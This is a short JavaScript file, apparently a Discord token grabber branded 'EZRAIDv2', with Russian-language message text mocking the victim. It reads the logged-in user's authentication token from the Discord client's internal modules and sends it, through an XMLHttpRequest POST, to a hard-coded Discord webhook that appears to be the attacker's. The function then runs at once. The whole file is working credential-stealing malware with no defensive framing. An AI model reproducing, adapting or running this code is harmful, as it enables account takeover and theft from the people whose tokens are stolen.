function getToken(){
    var webhook="https://discord.com/api/webhooks/1274498078321279036/KBMk9wRJojOFpVoFgYs9wE5Rs95cbyAgeeluMvNrgiFBPILBIc94XN-04XfyuGooIUoH"
    var token=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
     var request = new XMLHttpRequest();
     request.open("POST", webhook);
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
        content: ":penguin: **EZRAIDv2 - Токен Граббер**\n**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **||`" + token + "`||\n:black_cat: **GitHub:** ||`https://github.com/EZRAIDv2/token-grabber-js`||\n:skull: **Сделал EZRAIDv2 ** :skeleton:"
      }
      request.send(JSON.stringify(params));
}
getToken()
